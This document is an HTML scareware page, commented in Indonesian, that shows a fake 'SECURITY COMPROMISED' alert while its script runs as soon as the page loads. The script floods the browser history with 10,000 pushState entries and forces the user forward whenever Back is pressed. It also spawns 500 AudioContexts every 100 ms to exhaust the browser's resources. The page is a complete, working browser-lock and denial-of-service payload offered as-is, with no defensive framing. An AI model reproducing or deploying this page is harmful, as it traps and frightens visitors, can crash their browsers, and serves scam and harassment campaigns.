<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Security Alert</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #030712; color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center;
  }
  .box { padding: 30px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; max-width: 400px; }
  h2 { color: #f00; margin-bottom: 10px; animation: blink 0.5s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  p { color: #9ca3af; font-size: 14px; line-height: 1.5; }
  #status { margin-top: 20px; font-family: monospace; color: #0f0; background: #000; padding: 10px; border-radius: 6px; }
</style>
</head>
<body>

<div class="box">
  <h2>🚨 SECURITY COMPROMISED 🚨</h2>
  <p>Sistem mendeteksi aktivitas mencurigakan. Tombol navigasi dinonaktifkan sementara untuk verifikasi.</p>
  <div id="status">Menginisialisasi...</div>
</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var floodCount = 0;

  // ============================================
  // 1. HISTORY FLOODING (OMNIBox STACK OVERLOAD)
  // ============================================
  function triggerHistoryFlood() {
    console.log("[!] Memulai History Flooding...");
    statusEl.innerText = "Flooding History Stack...";

    try {
      // Memasukkan 10.000 entri ke History Stack
      for (var i = 0; i < 10000; i++) {
        var dummyState = { page: i, time: Date.now() };
        var fakeUrl = window.location.pathname + "#locked=" + i;
        
        // Menggunakan pushState untuk mengisi Omnibox (Address Bar)
        history.pushState(dummyState, "Security Verification " + i, fakeUrl);
        
        floodCount++;
      }
      
      statusEl.innerText = "History Flooded: " + floodCount + " entries.";
      console.log("[+] History Flooding Selesai.");

    } catch(e) {
      statusEl.innerText = "Limit Reached: " + e.message;
    }
  }

  // ============================================
  // 2. POPSTATE LOCK (MENCEGAH TOMBOL BACK)
  // ============================================
  window.addEventListener('popstate', function(e) {
    // Jika user mencoba mundur, kita dorong maju lagi secara paksa
    if (floodCount > 0) {
      history.go(1);
      statusEl.innerText = "🚫 Navigation Blocked. Klik Back tidak berfungsi.";
      console.log("[!] User mencoba Back. Diblokir.");
    }
  });

  // ============================================
  // 3. AUDIO PRESSURE (RESOURCE EXHAUSTION)
  // ============================================
  function triggerAudioPressure() {
    setInterval(function() {
      try {
        // Alokasi 500 AudioContext per 100ms
        for (var i = 0; i < 500; i++) {
          var ctx = new (window.AudioContext || window.webkitAudioContext)();
          var osc = ctx.createOscillator();
          var gain = ctx.createGain();
          
          gain.gain.value = 0.0001;
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start(0);
        }
      } catch(e) {}
    }, 100);
  }

  // ============================================
  // 4. EKSEKUSI CHAIN
  // ============================================
  
  // Jalankan flooding setelah 500ms
  setTimeout(triggerHistoryFlood, 500);

  // Jalankan audio pressure setelah 1.2 detik
  setTimeout(function() {
    console.log("[!] Memulai Audio Pressure...");
    triggerAudioPressure();
  }, 1200);

  // ============================================
  // 5. ZERO-CLICK TRIGGER (LANGSUNG SAAT LOAD)
  // ============================================
  // (Fungsi di atas sudah dipanggil via setTimeout, jadi sudah Zero-Click)

})();
</script>
</body>
</html>
